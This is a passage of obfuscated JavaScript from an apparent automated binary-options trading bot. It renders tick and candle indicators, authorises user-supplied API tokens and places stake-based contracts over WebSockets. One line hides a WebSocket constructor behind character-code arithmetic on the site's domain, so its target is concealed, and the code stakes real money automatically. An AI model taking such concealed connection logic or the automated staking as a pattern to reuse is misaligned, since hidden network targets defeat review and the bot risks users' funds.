      document.getElementById("thelast10ticks_change_" + _0x2e02b8).style.backgroundColor = document.getElementById("thelast10ticks_%_" + _0x2e02b8).style.backgroundColor = _0xacdd96 > 0 ? colorRise : _0xacdd96 < 0 ? colorFall : colorNo;
      thelast10ticks_tick_list.push(document.getElementById("thelast10ticks_tick_" + _0x2e02b8).innerText * 1);
      _0x62a66a.push(document.getElementById("thelast10ticks_tick_" + _0x2e02b8).style.backgroundColor);
      thelast10ticks_move_list.push(document.getElementById("thelast10ticks_move_" + _0x2e02b8).innerText);
      thelast10ticks_change_list.push(document.getElementById("thelast10ticks_change_" + _0x2e02b8).innerText * 1);
      _0x1bcbf0.push(document.getElementById("thelast10ticks_change_" + _0x2e02b8).style.backgroundColor);
    }
    addDataChartLast10Tick_Tick(mainChartLast10Tick_Tick, thelast10ticks_tick_list, _0x62a66a);
    addDataChartLast10Tick_Change(mainChartLast10Tick_Change, thelast10ticks_change_list, _0x1bcbf0);
  }
  let _0x22f87f = btn_run.src.split("/").pop() === "icon_run.png" || btn_run.src.split("/").pop() === "icon_stop.png" && mainWorkspaceCode.indexOf("thelast20tickworm") != -1;
  if (_0x22f87f && selData.value == "thelast20tickworm") {
    document.getElementById("div_thelast20tickworm").style.display = "block";
  } else {
    document.getElementById("div_thelast20tickworm").style.display = "none";
  }
  if (_0x22f87f) {
    let _0x253a4b;
    let _0x5ced71;
    let _0x298db9;
    _0x226726 = _0x15a26b.slice(-39);
    thelast20tickworm_history_list = [];
    thelast20tickworm_current_list = [];
    _0x253a4b = [];
    _0x5ced71 = [];
    _0x298db9 = [];
    for (i = 19; i < _0x226726.length; i++) {
      _0x2e02b8 = _0x226726.length - i;
      _0x3f0ad1 = _0x226726.slice(i - 19, i + 1);
      document.getElementById("thelast20tickworm_history_" + _0x2e02b8).innerText = _0x226726[i] == Math.max(..._0x3f0ad1) ? "Blue" : _0x226726[i] == Math.min(..._0x3f0ad1) ? "Red" : "Green";
      thelast20tickworm_history_list.push(document.getElementById("thelast20tickworm_history_" + _0x2e02b8).innerText);
      document.getElementById("thelast20tickworm_history_" + _0x2e02b8).style.backgroundColor = _0x226726[i] == Math.max(..._0x3f0ad1) ? colorRise : _0x226726[i] == Math.min(..._0x3f0ad1) ? colorFall : colorWormNo;
    }
    _0x3f0ad1 = _0x226726.slice(-20);
    for (i = 19; i < _0x226726.length; i++) {
      _0x2e02b8 = _0x226726.length - i;
      document.getElementById("thelast20tickworm_current_" + _0x2e02b8).innerText = _0x226726[i] == Math.max(..._0x3f0ad1) ? "Blue" : _0x226726[i] == Math.min(..._0x3f0ad1) ? "Red" : "Green";
      document.getElementById("thelast20tickworm_current_" + _0x2e02b8).style.backgroundColor = _0x226726[i] == Math.max(..._0x3f0ad1) ? colorRise : _0x226726[i] == Math.min(..._0x3f0ad1) ? colorFall : colorWormNo;
      thelast20tickworm_current_list.push(document.getElementById("thelast20tickworm_current_" + _0x2e02b8).innerText);
      _0x253a4b.push(_0x226726[i]);
      _0x5ced71.push(document.getElementById("thelast20tickworm_current_" + _0x2e02b8).style.backgroundColor);
      if (i != _0x226726.length - 1) {
        _0x298db9.push(_0x226726[i] == Math.max(..._0x3f0ad1) ? "circle" : _0x226726[i] == Math.min(..._0x3f0ad1) ? "circle" : false);
      } else {
        _0x298db9.push("circle");
      }
    }
    addDataChart20TickWorm(mainChart20TickWorm, _0x253a4b, _0x5ced71, _0x298db9);
  }
  let _0x1151eb = btn_run.src.split("/").pop() === "icon_run.png" || btn_run.src.split("/").pop() === "icon_stop.png" && (mainWorkspaceCode.indexOf("tick_sma") != -1 || mainWorkspaceCode.indexOf("TickTrisma") != -1);
  if (_0x1151eb && selData.value == "tick_Trisma") {
    document.getElementById("div_tick_Trisma").style.display = "block";
  } else {
    document.getElementById("div_tick_Trisma").style.display = "none";
  }
  if (_0x1151eb) {
    tick_sma_list = [];
    tempArray1 = calculateMovingAverage(_0x15a26b, inpTickTrisma_period[1].value * 1).slice(-101);
    tempArray2 = calculateMovingAverage(_0x15a26b, inpTickTrisma_period[2].value * 1).slice(-101);
    tempArray3 = calculateMovingAverage(_0x15a26b, inpTickTrisma_period[3].value * 1).slice(-101);
    for (i = 81; i < 101; i++) {
      document.getElementById("tick_sma1_" + (101 - i)).innerText = tempArray1[i].toFixed(2);
      document.getElementById("tick_sma1_" + (101 - i)).style.backgroundColor = tempArray1[i - 1] < tempArray1[i] ? colorRise : tempArray1[i - 1] > tempArray1[i] ? colorFall : colorNo;
      document.getElementById("tick_sma2_" + (101 - i)).innerText = tempArray2[i].toFixed(2);
      document.getElementById("tick_sma2_" + (101 - i)).style.backgroundColor = tempArray2[i - 1] < tempArray2[i] ? colorRise : tempArray2[i - 1] > tempArray2[i] ? colorFall : colorNo;
      document.getElementById("tick_sma3_" + (101 - i)).innerText = tempArray3[i].toFixed(2);
      document.getElementById("tick_sma3_" + (101 - i)).style.backgroundColor = tempArray3[i - 1] < tempArray3[i] ? colorRise : tempArray3[i - 1] > tempArray3[i] ? colorFall : colorNo;
    }
    tick_sma_list[1] = tempArray1.slice(-20);
    tick_sma_list[2] = tempArray2.slice(-20);
    tick_sma_list[3] = tempArray3.slice(-20);
    addDataChartticktrisma(mainChartTickTrisma, [_0x15a26b.slice(-101), tempArray1, tempArray2, tempArray3]);
  }
  let _0x411919 = btn_run.src.split("/").pop() === "icon_run.png" || btn_run.src.split("/").pop() === "icon_stop.png" && mainWorkspaceCode.indexOf("detail3ticks") != -1;
  if (_0x411919 && selData.value == "detail3ticks") {
    document.getElementById("div_detail3ticks").style.display = "block";
  } else {
    document.getElementById("div_detail3ticks").style.display = "none";
  }
  if (_0x411919) {
    let _0xf76c1d = "";
    _0x4881c3 = _0x15a26b.slice(-3);
    for (i = 1; i <= 3; i++) {
      _0xf76c1d = _0x4881c3[3 - i].toFixed(_0x9a9ef4).substring(0, 13);
      document.getElementById("detail3ticks_" + i + "_tick").innerText = _0xf76c1d;
      for (k = 0; k < 12; k++) {
        if (k < _0xf76c1d.length) {
          document.getElementById("detail3ticks_" + i + "_" + (k + 1)).innerText = _0xf76c1d.charAt(k);
        } else {
          document.getElementById("detail3ticks_" + i + "_" + (k + 1)).innerText = "";
        }
      }
    }
  }
  if (_0x4e96da == "history") {
    sedangForgetAllTicks = false;
  }
  ;
  checkIfReadyToMainLogic();
};
const showUpAboutMultiMarket_Continuous = (_0x4ba4cb, _0xc14313, _0xce80f1, _0x40c6a9, _0x52e5ed) => {
  let _0x20e815 = btn_run.src.split("/").pop() === "icon_run.png" || btn_run.src.split("/").pop() === "icon_stop.png" && mainWorkspaceCode.indexOf("continuousindices") != -1;
  if (_0x20e815 && selData.value == "continuousindices") {
    document.getElementById("div_continuousindices").style.display = "block";
  } else {
    document.getElementById("div_continuousindices").style.display = "none";
  }
  if (_0x20e815) {
    document.getElementById("continuousindices_" + _0x4ba4cb + "_ticks").value = _0xc14313;
    document.getElementById("continuousindices_" + _0x4ba4cb + "_digits").value = _0xce80f1;
  }
  if (_0x52e5ed == "history") {
    sedangForgetAllTicks = false;
  }
  ;
  if (Date.now() - lastTimeCheckIfReadyToMainLogic_continuousindices[_0x4ba4cb] < 500) {
    return;
  }
  ;
  lastTimeCheckIfReadyToMainLogic_continuousindices[_0x4ba4cb] = Date.now();
  if (sudahRunOnceAtStart && btn_run.src.split("/").pop() === "icon_stop.png" && !sedangForgetAllTicks && navigator.onLine) {
    updateStepper(1);
    if (!chkVLose.checked || inpVLose.value <= 0) {
      conn_nya = _0x1a19x7;
    } else if (chkVLose.checked && countVLose < inpVLose.value) {
      if (!slaveAuthorized) {
        return;
      }
      conn_nya = _0x1a19x8;
    } else {
      conn_nya = _0x1a19x7;
    }
    if (Date.now() >= timeMayOP && navigator.onLine && !sedangForgetAllTicks) {
      mainTickArray_continuousindices = _0xc14313;
      mainDigitArray_continuousindices = _0xce80f1;
      mainMarket_continuousindices = arrMarket_Continuous[_0x4ba4cb - 1];
      func$1$9$8$7$PurchaseConditions_continuousindices();
    }
  }
};
const showUpCandle = (_0x322051, _0x3b3230, _0x39c420) => {
  let _0xcf2186;
  let _0x338f61;
  let _0x41d582;
  let _0x2ef980;
  let _0x81d26d;
  for (i = 10; i > _0x3b3230.length; i--) {
    _0xcf2186 = document.getElementById("thelast10candles_" + _0x322051 + "_" + i);
    _0xcf2186.innerText = "";
    _0xcf2186.style = "";
  }
  for (i = 0; i < _0x3b3230.length; i++) {
    _0xcf2186 = document.getElementById("thelast10candles_" + _0x322051 + "_" + (_0x3b3230.length - i));
    if (_0x3b3230[i].close > _0x3b3230[i].open) {
      _0x338f61 = "Bull";
      _0x41d582 = colorRise;
    } else if (_0x3b3230[i].close < _0x3b3230[i].open) {
      _0x338f61 = "Bear";
      _0x41d582 = colorFall;
    } else {
      _0x338f61 = "Doji";
      _0x41d582 = colorNo;
    }
    _0xcf2186.innerText = _0x338f61;
    _0xcf2186.style.backgroundColor = _0x41d582;
  }
  document.getElementById("thelast10candles_" + _0x322051 + "_1_open").innerText = _0x3b3230[_0x3b3230.length - 1].open.toFixed(_0x39c420);
  document.getElementById("thelast10candles_" + _0x322051 + "_1_high").innerText = _0x3b3230[_0x3b3230.length - 1].high.toFixed(_0x39c420);
  document.getElementById("thelast10candles_" + _0x322051 + "_1_low").innerText = _0x3b3230[_0x3b3230.length - 1].low.toFixed(_0x39c420);
  document.getElementById("thelast10candles_" + _0x322051 + "_1_close").innerText = _0x3b3230[_0x3b3230.length - 1].close.toFixed(_0x39c420);
  if (_0x3b3230.length > 1) {
    _0x2ef980 = _0x3b3230[_0x3b3230.length - 1].close - _0x3b3230[_0x3b3230.length - 2].close;
    _0x81d26d = _0x2ef980 / _0x3b3230[_0x3b3230.length - 2].close * 100;
    document.getElementById("thelast10candles_" + _0x322051 + "_1_change").innerText = (_0x2ef980 > 0 ? "+" : _0x2ef980 < 0 ? "-" : "") + Math.abs(_0x2ef980).toFixed(2);
    document.getElementById("thelast10candles_" + _0x322051 + "_1_changepercent").innerText = (_0x2ef980 > 0 ? "+" : _0x2ef980 < 0 ? "-" : "") + Math.abs(_0x81d26d).toFixed(2);
    document.getElementById("thelast10candles_" + _0x322051 + "_1_change").style.backgroundColor = document.getElementById("thelast10candles_" + _0x322051 + "_1_changepercent").style.backgroundColor = _0x2ef980 > 0 ? colorRise : _0x2ef980 < 0 ? colorFall : colorNo;
  } else {
    document.getElementById("thelast10candles_" + _0x322051 + "_1_change").innerText = document.getElementById("thelast10candles_" + _0x322051 + "_1_changepercent").innerText = document.getElementById("thelast10candles_" + _0x322051 + "_1_change").style = document.getElementById("thelast10candles_" + _0x322051 + "_1_changepercent").style = "";
  }
  checkIfReadyToMainLogic();
};
const checkIfReadyToMainLogic = () => {
  if (Date.now() - lastTimeCheckIfReadyToMainLogic < 500) {
    return;
  }
  ;
  lastTimeCheckIfReadyToMainLogic = Date.now();
  if (sudahRunOnceAtStart && btn_run.src.split("/").pop() === "icon_stop.png" && !sedangForgetAllTicks && navigator.onLine) {
    mainLogic();
  } else if (prContract.length != 0) {}
};
const btn_runClickResponse = () => {
  if (btn_run.src.split("/").pop() == "icon_run.png") {
    if (inpMToken.value.trim().length == 0) {
      $.notify("Please set MASTER TOKEN.", {
        position: "bottom left",
        className: "warn"
      });
      document.getElementById("divPopupToken").style.display = "block";
      inpMToken.focus();
    } else {
      mainWorkspaceCode = javascript.javascriptGenerator.workspaceToCode(Blockly.getMainWorkspace());
      updateStatusBotRunning("Bot is preparing...");
      ubahbtn_run("stop");
      updateStepper(0);
      countVLose = 0;
      sudahRunOnceAtStart = false;
      if (inpSToken.value.trim().length > 0) {
        authorizeV();
      }
      authorize();
      showBoxSummary();
      document.getElementById("btn_clearBoxSummary").hidden = true;
    }
  } else if (btn_run.src.split("/").pop() == "icon_stop.png") {
    emptyAllFunc();
    ubahbtn_run("run");
    updateStatusBotRunning("Bot is not running.");
    sedangAuthorize = false;
    sedangAuthorizeV = false;
    sudahRunOnceAtStart = false;
    timeMayOP = 0;
    document.getElementById("btn_clearBoxSummary").hidden = false;
    refreshBoxData(selData.value);
  }
};
const emptyAllFunc = () => {
  func$1$9$8$7$RunOnceAtStart = () => {
    izinRun2 = false;
  };
  func$1$9$8$7$PurchaseConditions = () => {
    if (izinRun2) {
      izinRun2 = false;
    }
    ;
  };
  func$1$9$8$7$PurchaseConditions_continuousindices = () => {};
  func$1$9$8$7$SellConditions = () => {};
  func$1$9$8$7$RestartTradingConditions = () => {};
};
emptyAllFunc();
const openResponse = () => {
  wsMasterOpened = true;
  getSymbols();
  cekWSOpened();
  if (sedangAuthorize) {
    authorize();
  }
};
const openResponseV = () => {
  wsSlaveOpened = true;
  cekWSOpened();
  if (sedangAuthorizeV) {
    authorizeV();
  }
};
const getSymbols = () => {
  _0x1a19x7.send(JSON.stringify({
    active_symbols: "brief",
    passthrough: {
      app_id: app_id
    }
  }));
};
const arrangeSymbols = _0x34ae12 => {
  arrMarket = [];
  arrMarketToSubMarket = [];
  arrSubMarketToSymbol = [];
  for (i = 0; i < _0x34ae12.active_symbols.length; i++) {
    if (!arrMarket.includes(_0x34ae12.active_symbols[i].market_display_name)) {
      arrMarket.push(_0x34ae12.active_symbols[i].market_display_name);
    }
    if (!arrMarketToSubMarket.includes(_0x34ae12.active_symbols[i].market_display_name + "|" + _0x34ae12.active_symbols[i].submarket_display_name)) {
      arrMarketToSubMarket.push(_0x34ae12.active_symbols[i].market_display_name + "|" + _0x34ae12.active_symbols[i].submarket_display_name);
    }
    if (!arrSubMarketToSymbol.includes(_0x34ae12.active_symbols[i].submarket_display_name + "|" + _0x34ae12.active_symbols[i].display_name + "|" + _0x34ae12.active_symbols[i].symbol)) {
      arrSubMarketToSymbol.push(_0x34ae12.active_symbols[i].submarket_display_name + "|" + _0x34ae12.active_symbols[i].display_name + "|" + _0x34ae12.active_symbols[i].symbol);
    }
  }
  selMarket.innerHTML = "";
  for (i = 0; i < arrMarket.length; i++) {
    el = document.createElement("option");
    el.textContent = arrMarket[i];
    el.value = arrMarket[i];
    selMarket.appendChild(el);
  }
  if (localStorage.getItem("selSymbol") != null) {
    setMarket(localStorage.getItem("selSymbol"));
  } else {
    setMarket("1HZ10V");
  }
};
const setMarket = _0x4d87d7 => {
  let _0xae4410;
  let _0x59d3aa;
  for (i = 0; i < arrSubMarketToSymbol.length; i++) {
    if (arrSubMarketToSymbol[i].split("|")[2] == _0x4d87d7) {
      _0x59d3aa = arrSubMarketToSymbol[i].split("|")[0];
      break;
    }
  }
  for (i = 0; i < arrMarketToSubMarket.length; i++) {
    if (arrMarketToSubMarket[i].split("|")[1] == _0x59d3aa) {
      _0xae4410 = arrMarketToSubMarket[i].split("|")[0];
      break;
    }
  }
  selMarket.value = _0xae4410;
  fillSubMarket(_0x59d3aa, _0x4d87d7);
};
const fillSubMarket = (_0x276737, _0x3cc57f) => {
  selSubMarket.innerHTML = "";
  for (i = 0; i < arrMarketToSubMarket.length; i++) {
    if (arrMarketToSubMarket[i].split("|")[0] == selMarket.value) {
      el = document.createElement("option");
      el.textContent = arrMarketToSubMarket[i].split("|")[1];
      el.value = arrMarketToSubMarket[i].split("|")[1];
      selSubMarket.appendChild(el);
    }
  }
  if (_0x276737 != "none") {
    selSubMarket.value = _0x276737;
  }
  fillSymbol(_0x3cc57f);
};
const fillSymbol = _0x2e0bac => {
  selSymbol.innerHTML = "";
  for (i = 0; i < arrSubMarketToSymbol.length; i++) {
    if (arrSubMarketToSymbol[i].split("|")[0] == selSubMarket.value) {
      el = document.createElement("option");
      el.textContent = arrSubMarketToSymbol[i].split("|")[1];
      el.value = arrSubMarketToSymbol[i].split("|")[2];
      selSymbol.appendChild(el);
    }
  }
  if (_0x2e0bac != "none") {
    selSymbol.value = _0x2e0bac;
  }
  mainSymbol = selSymbol.value;
  document.getElementById("lblMarket").innerText = selSymbol.options[selSymbol.selectedIndex].text;
  localStorage.setItem("selSymbol", selSymbol.value);
  forgetAllTicks();
};
const marketChanged = () => {
  fillSubMarket("none", "none");
};
const subMarketChanged = () => {
  fillSymbol("none");
};
const cekWSOpened = () => {
  if (!wsSlaveSudahFirstOpened && wsMasterOpened && wsSlaveOpened) {
    wsSlaveSudahFirstOpened = true;
    btn_run.disabled = btn_run2.disabled = btnSimpleRun.disabled = false;
    btn_run.style.visibility = btn_run2.style.visibility = btnSimpleRun.style.visibility = "visible";
    btnSimpleRun.style.opacity = 1;
    ubahbtn_run("run");
    spanSimpleRobotName.innerText = "Robot : " + (localStorage.getItem("mainRobotName") == null ? "-" : localStorage.getItem("mainRobotName"));
    writeLog("", "Initialized.");
  }
};
const closeResponse = () => {
  wsMasterOpened = false;
};
const closeResponseV = () => {
  wsSlaveOpened = false;
  slaveAuthorized = false;
};
const authorize = () => {
  _0x1a19x7.send(JSON.stringify({
    forget: idSubBalance,
    passthrough: {
      app_id: app_id
    }
  }));
  summary_balance.innerText = "-";
  _0x1a19x7.send(JSON.stringify({
    authorize: inpMToken.value,
    passthrough: {
      app_id: app_id
    }
  }));
};
const authorizeV = () => {
  slaveAuthorized = false;
  // TOLOOK
  setTimeout(() => {
    if (_0x1a19x8.readyState == 1) {
      _0x1a19x8.send(JSON.stringify({
        authorize: inpSToken.value,
        passthrough: {
          app_id: app_id
        }
      }));
    } else {
      authorizeV();
    }
  }, 5000);
};
const randomArray = _0xe62c48 => {
  return _0xe62c48[Math.floor(Math.random() * _0xe62c48.length)];
};
const mainPurchase = (_0x3f7cb2, _0x6311be, _0x49826e, _0x4880ef, _0x3282c7, _0x57bc3a, _0x45fc11, _0x4807ba, _0x34fb77, _0x367169, _0x598ac2, _0x532e7c, _0x2a7807, _0x56e1b7, _0x48c283, _0x3b003d, _0x485ab4, _0x2bb599, _0x5a158c) => {
  if (sedangForgetAllTicks) {
    return;
  }
  updateStepper(2);
  tempDuration = _0x45fc11 == "rt" ? Math.floor(Math.random() * 10) + 1 : _0x57bc3a;
  tempDurationUnit = _0x45fc11 == "rt" ? "t" : _0x45fc11;
  if (tempDurationUnit == "t") {
    tempDetikPengali = _0x3282c7.includes("1HZ") ? 1 : 2;
  } else if (tempDurationUnit == "s") {
    tempDetikPengali = 1;
  } else if (tempDurationUnit == "m") {
    tempDetikPengali = 60;
  } else if (tempDurationUnit == "h") {
    tempDetikPengali = 3600;
  } else if (tempDurationUnit == "d") {
    tempDetikPengali = 86400;
  }
  if (_0x3f7cb2 == "master") {
    conn_nya = _0x1a19x7;
  } else if (_0x3f7cb2 == "slave") {
    conn_nya = _0x1a19x8;
  }
  ;
  if (_0x6311be == "manual") {
    stakeNow = _0x49826e;
  }
  ;
  if (["CALL", "PUT", "CALLE", "PUTE", "ONETOUCH", "NOTOUCH", "DIGITDIFF", "DIGITMATCH", "DIGITOVER", "DIGITUNDER", "VANILLALONGCALL", "VANILLALONGPUT", "TURBOSLONG", "TURBOSSHORT"].includes(_0x4880ef)) {
    let _0x250e61;
    if (["CALL", "PUT", "CALLE", "PUTE", "ONETOUCH", "NOTOUCH", "VANILLALONGCALL", "VANILLALONGPUT", "TURBOSLONG", "TURBOSSHORT"].includes(_0x4880ef)) {
      _0x250e61 = _0x4807ba;
    } else if (["DIGITDIFF", "DIGITMATCH"].includes(_0x4880ef)) {
      _0x250e61 = _0x598ac2;
    } else if (["DIGITOVER"].includes(_0x4880ef)) {
      _0x250e61 = _0x532e7c;
    } else if (["DIGITUNDER"].includes(_0x4880ef)) {
      _0x250e61 = _0x2a7807;
    }
    if (["CALL", "PUT", "CALLE", "PUTE"].includes(_0x4880ef) && (_0x250e61 == "+0" || _0x250e61 == "-0" || _0x250e61 == 0)) {
      writeLog("", (conn_nya == _0x1a19x8 ? "[Virtual] " : "") + "Purchasing " + _0x4880ef + " [stake: " + parseFloat(stakeNow).toFixed(2) + ", duration: " + tempDuration + tempDurationUnit + ", " + _0x3282c7 + "]");
      conn_nya.send(JSON.stringify({
        subscribe: 1,
        buy: 1,
        parameters: {
          amount: parseFloat(stakeNow).toFixed(2),
          basis: "stake",
          contract_type: _0x4880ef,
          currency: conn_nya == _0x1a19x8 ? slaveCurrency : masterCurrency,
          duration: tempDuration,
          duration_unit: tempDurationUnit,
          symbol: _0x3282c7
        },
        price: 999999,
        passthrough: {
          app_id: app_id,
          tempDuration: tempDuration,
          tempDetikPengali: tempDetikPengali
        }
      }));
    } else {
      writeLog("", (conn_nya == _0x1a19x8 ? "[Virtual] " : "") + "Purchasing " + _0x4880ef + " " + _0x250e61 + " [stake: " + parseFloat(stakeNow).toFixed(2) + ", duration: " + tempDuration + tempDurationUnit + ", " + _0x3282c7 + "]");
      conn_nya.send(JSON.stringify({
        subscribe: 1,
        buy: 1,
        parameters: {
          amount: parseFloat(stakeNow).toFixed(2),
          barrier: _0x250e61,
          basis: "stake",
          contract_type: _0x4880ef,
          currency: conn_nya == _0x1a19x8 ? slaveCurrency : masterCurrency,
          duration: tempDuration,
          duration_unit: tempDurationUnit,
          symbol: _0x3282c7
        },
        price: 999999,
        passthrough: {
          app_id: app_id,
          tempDuration: tempDuration,
          tempDetikPengali: tempDetikPengali
        }
      }));
    }
  } else if (["EXPIRYRANGE", "EXPIRYMISS", "RANGE", "UPORDOWN"].includes(_0x4880ef)) {
    writeLog("", (conn_nya == _0x1a19x8 ? "[Virtual] " : "") + "Purchasing " + _0x4880ef + " " + _0x34fb77 + " " + _0x367169 + " [stake: " + parseFloat(stakeNow).toFixed(2) + ", duration: " + tempDuration + tempDurationUnit + ", " + _0x3282c7 + "]");
    conn_nya.send(JSON.stringify({
      subscribe: 1,
      buy: 1,
      parameters: {
        amount: parseFloat(stakeNow).toFixed(2),
        barrier: _0x34fb77,
        barrier2: _0x367169,
        basis: "stake",
        contract_type: _0x4880ef,
        currency: conn_nya == _0x1a19x8 ? slaveCurrency : masterCurrency,
        duration: tempDuration,
        duration_unit: tempDurationUnit,
        symbol: _0x3282c7
      },
      price: 999999,
      passthrough: {
        app_id: app_id,
        tempDuration: tempDuration,
        tempDetikPengali: tempDetikPengali
      }
    }));
  } else if (["ASIANU", "ASIAND", "DIGITEVEN", "DIGITODD", "RESETCALL", "RESETPUT", "RUNHIGH", "RUNLOW"].includes(_0x4880ef)) {
    writeLog("", (conn_nya == _0x1a19x8 ? "[Virtual] " : "") + "Purchasing " + _0x4880ef + " [stake: " + parseFloat(stakeNow).toFixed(2) + ", duration: " + tempDuration + tempDurationUnit + ", " + _0x3282c7 + "]");
    conn_nya.send(JSON.stringify({
      subscribe: 1,
      buy: 1,
      parameters: {
        amount: parseFloat(stakeNow).toFixed(2),
        basis: "stake",
        contract_type: _0x4880ef,
        currency: conn_nya == _0x1a19x8 ? slaveCurrency : masterCurrency,
        duration: tempDuration,
        duration_unit: tempDurationUnit,
        symbol: _0x3282c7
      },
      price: 999999,
      passthrough: {
        app_id: app_id,
        tempDuration: tempDuration,
        tempDetikPengali: tempDetikPengali
      }
    }));
  } else if (["LBFLOATPUT", "LBFLOATCALL", "LBHIGHLOW"].includes(_0x4880ef)) {
    writeLog("", (conn_nya == _0x1a19x8 ? "[Virtual] " : "") + "Purchasing " + _0x4880ef + " [multiplier: " + _0x56e1b7 + ", duration: " + tempDuration + tempDurationUnit + ", " + _0x3282c7 + "]");
    conn_nya.send(JSON.stringify({
      subscribe: 1,
      buy: 1,
      parameters: {
        amount: parseFloat(stakeNow).toFixed(2),
        multiplier: _0x56e1b7,
        contract_type: _0x4880ef,
        currency: conn_nya == _0x1a19x8 ? slaveCurrency : masterCurrency,
        duration: tempDuration,
        duration_unit: tempDurationUnit,
        symbol: _0x3282c7
      },
      price: 999999,
      passthrough: {
        app_id: app_id,
        tempDuration: tempDuration,
        tempDetikPengali: tempDetikPengali
      }
    }));
  } else if (["TICKHIGH", "TICKLOW"].includes(_0x4880ef)) {
    writeLog("", (conn_nya == _0x1a19x8 ? "[Virtual] " : "") + "Purchasing " + _0x4880ef + " " + _0x48c283 + " [stake: " + parseFloat(stakeNow).toFixed(2) + ", duration: " + tempDuration + tempDurationUnit + ", " + _0x3282c7 + "]");
    conn_nya.send(JSON.stringify({
      subscribe: 1,
      buy: 1,
      parameters: {
        amount: parseFloat(stakeNow).toFixed(2),
        selected_tick: _0x48c283,
        basis: "stake",
        contract_type: _0x4880ef,
        currency: conn_nya == _0x1a19x8 ? slaveCurrency : masterCurrency,
        duration: tempDuration,
        duration_unit: tempDurationUnit,
        symbol: _0x3282c7
      },
      price: 999999,
      passthrough: {
        app_id: app_id,
        tempDuration: tempDuration,
        tempDetikPengali: tempDetikPengali
      }
    }));
  } else if (["ACCU"].includes(_0x4880ef)) {
    writeLog("", (conn_nya == _0x1a19x8 ? "[Virtual] " : "") + "Purchasing " + _0x4880ef + " [stake: " + parseFloat(stakeNow).toFixed(2) + ", growth rate: " + _0x3b003d + "%, take profit: " + _0x2bb599 + ", " + _0x3282c7 + "]");
    conn_nya.send(JSON.stringify({
      subscribe: 1,
      buy: 1,
      parameters: {
        amount: parseFloat(stakeNow).toFixed(2),
        growth_rate: _0x3b003d / 100,
        limit_order: {
          take_profit: _0x2bb599
        },
        basis: "stake",
        contract_type: _0x4880ef,
        currency: conn_nya == _0x1a19x8 ? slaveCurrency : masterCurrency,
        symbol: _0x3282c7
      },
      price: 999999,
      passthrough: {
        app_id: app_id,
        tempDuration: tempDuration,
        tempDetikPengali: tempDetikPengali
      }
    }));
  } else if (["MULTUP", "MULTDOWN"].includes(_0x4880ef)) {
    writeLog("", (conn_nya == _0x1a19x8 ? "[Virtual] " : "") + "Purchasing " + _0x4880ef + " x" + _0x485ab4 + " [stake: " + parseFloat(stakeNow).toFixed(2) + ", TP: " + _0x2bb599 + ", SL: " + _0x5a158c + ", " + _0x3282c7 + "]");
    conn_nya.send(JSON.stringify({
      subscribe: 1,
      buy: 1,
      parameters: {
        amount: parseFloat(stakeNow).toFixed(2),
        multiplier: _0x485ab4,
        limit_order: {
          take_profit: _0x2bb599,
          stop_loss: _0x5a158c
        },
        basis: "stake",
        contract_type: _0x4880ef,
        currency: conn_nya == _0x1a19x8 ? slaveCurrency : masterCurrency,
        symbol: _0x3282c7
      },
      price: 999999,
      passthrough: {
        app_id: app_id,
        tempDuration: tempDuration,
        tempDetikPengali: tempDetikPengali
      }
    }));
  }
};
const funcSellAtMarket = () => {
  conn_nya.send(JSON.stringify({
    sell: prContract[sedangPantauContractPos],
    price: 0
  }));
};
const _0x1904 = String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 21) + "bS" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "ck" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 21) + "t('" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(154 % 12) + 3) + _0x1903;
const updateResult = (_0x2e8f29, _0x120f08, _0x5260b8, _0x199384, _0xf1c45b, _0x3e14c4, _0x1b3b9f, _0x28215d, _0x3ee1ab, _0x4472d0, _0x20def0, _0x57df16, _0x1ebdf7) => {
  updateStepper(4);
  tempPrContractPos = prContract.indexOf(_0x2e8f29);
  if (!winContract.includes(_0x2e8f29) && (_0x5260b8 >= 0 || _0x120f08 === "w" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "n")) {
    winContract.push(_0x2e8f29);
    rowActive[tempPrContractPos].cells[3].innerText = _0x57df16;
    rowActive[tempPrContractPos].cells[4].innerText = _0x199384;
    rowActive[tempPrContractPos].cells[5].innerText = _0x5260b8;
    rowActive[tempPrContractPos].cells[5].style.color = colorWormNo;
    summary_win.innerText = winContract.length;
    totalProfit += _0x5260b8;
    summary_totalstake.innerText = (summary_totalstake.innerText * 1 + _0x199384).toFixed(2);
    summary_totalpayout.innerText = (summary_totalpayout.innerText * 1 + _0xf1c45b).toFixed(2);
    summary_totalprofitloss.innerText = totalProfit.toFixed(2);
    summary_totalprofitloss.style.color = totalProfit > 0 ? colorWormNo : totalProfit < 0 ? colorFall : "#fff";
    countVLose = 0;
    tempWinInARow++;
    if (chkTP.checked && inpTP.value * 1 != 0 && totalProfit.toFixed(2) * 1 >= inpTP.value * 1) {
      if (btn_run.src.split("/").pop() == "icon_stop.png") {
        btn_run.click();
      }
      writeLog(colorWormNo, "TARGET PROFIT REACHED.");
      // TOLOOK
      setTimeout(() => {
        alert("TARGET PROFIT REACHED.");
      }, 500);
    } else if (chkNumOfWin.checked && inpNumOfWin.value * 1 != 0 && summary_win.innerText * 1 >= inpNumOfWin.value * 1) {
      if (btn_run.src.split("/").pop() == "icon_stop.png") {
        btn_run.click();
      }
      writeLog(colorWormNo, "NUMBER OF WIN(S) REACHED.");
      // TOLOOK
      setTimeout(() => {
        alert("NUMBER OF WIN(S) REACHED.");
      }, 500);
    } else if (chkNumOfRun.checked && inpNumOfRun.value * 1 != 0 && summary_noofruns.innerText * 1 >= inpNumOfRun.value * 1) {
      if (btn_run.src.split("/").pop() == "icon_stop.png") {
        btn_run.click();
      }
      writeLog("", "NUMBER OF RUN(S) REACHED.");
      // TOLOOK
      setTimeout(() => {
        alert("NUMBER OF RUN(S) REACHED.");
      }, 500);
    } else if (chkNumOfWinInARow.checked && inpNumOfWinInARow.value * 1 != 0 && tempWinInARow >= inpNumOfWinInARow.value * 1) {
      if (btn_run.src.split("/").pop() == "icon_stop.png") {
        btn_run.click();
      }
      writeLog(colorWormNo, "WIN(S) IN A ROW REACHED.");
      // TOLOOK
      setTimeout(() => {
        alert("WIN(S) IN A ROW REACHED.");
      }, 500);
    } else {
      if (["smartmartingale", "smartcyclestake"].includes(selMoneyManagement.value)) {
